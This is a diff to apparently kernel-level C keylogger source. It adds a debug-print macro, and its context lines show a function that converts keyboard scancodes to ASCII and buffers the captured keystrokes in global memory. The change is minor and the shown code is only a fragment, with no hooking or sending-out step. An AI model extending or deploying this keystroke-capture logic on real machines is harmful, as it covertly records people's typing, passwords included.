@@ -3,9 +3,14 @@
 
 #include "keylogger.h"
 
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
 extern uint64_t * __global_keylogger_counter;
 extern char * __global_keylogger_buffer;
-
 
 // Credit for this table from https://stackoverflow.com/questions/61124564/convert-scancodes-to-ascii
 // It's not nearly complete, but gets the message across for sure
@@ -46,7 +51,7 @@ char kbd_US [128] =
 
 void keylog_char(char c){
     uint64_t index = *(__global_keylogger_counter);
-    //printk("Index: %d\n", index);
+    //DEBUG_PRINT("Index: %d\n", index);
 
     if ((uint8_t)c > 127){
         return;
@@ -54,7 +59,7 @@ void keylog_char(char c){
     
     char ascii_char = kbd_US[(uint8_t)c];
     if ((uint8_t)ascii_char != 0){
-        //printk("Logging: %x\n", ascii_char);
+        //DEBUG_PRINT("Logging: %x\n", ascii_char);
         if (index >= 100){
             output_keylogger_buf();     // Print out the buffer
             clear_keylogger_buf();      // Clear the buffer
